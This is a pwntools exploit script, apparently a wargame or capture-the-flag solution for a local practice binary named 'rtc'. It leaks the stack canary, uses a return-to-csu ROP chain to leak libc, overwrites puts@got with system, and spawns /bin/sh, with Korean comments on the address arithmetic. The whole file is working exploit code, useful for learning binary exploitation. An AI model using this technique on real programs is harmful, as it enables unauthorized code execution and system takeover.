from pwn import *

def slog(name, addr):
	return success(": ".join([name, hex(addr)]))

def rtc_chain(func, arg1, arg2, arg3):
	return p64(0) + p64(1) + p64(func) + p64(arg1) + p64(arg2) + p64(arg3)	


p = process("./rtc")
e = ELF("./rtc")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#context.log_level = 'debug'
gdb.attach(p)


# [1] Leak Canary
buf = b'A'*57
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
slog("Canary", canary)



# [2] Write Payload
read_got = e.got['read']
puts_got = e.got['puts']
bss = e.bss()

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

csu_init1 = 0x4007fa
csu_init2 = 0x4007e0
dummy = p64(0)

payload = b'A'*56 + p64(canary) + b'B'*8


# puts(read@got)
payload += p64(csu_init1)
payload += rtc_chain(puts_got, read_got, 0, 0)


# read(0, bss, 8) => bss : "/bin/sh"
payload += dummy
payload += rtc_chain(read_got, 0, bss, 8)


# read(0, puts@got, 0) => puts@got -> system
payload += dummy
payload += rtc_chain(read_got, 0, puts_got, 0)


# puts("/bin/sh") => system("/bin/sh")
payload += dummy
payload += rtc_chain(puts_got, bss, 0, 0)


slog("payload length", len(payload))

# Exploit
p.sendafter("Buf2: ", payload)   		# puts()와 read got를 이용해서 read() 주소 출력
read = u64(p.recvn(6)+b'\x00'*2)    	# 화면에 출력된 read() 주소를 read에 대입
lb = read - read_offset        			# libc base = read 주소 - read symbols
system = lb + libc.symbols["system"]    # system = libc base + system symbols

slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(b"/bin/sh\x00")
p.send(p64(system))

p.interactive()

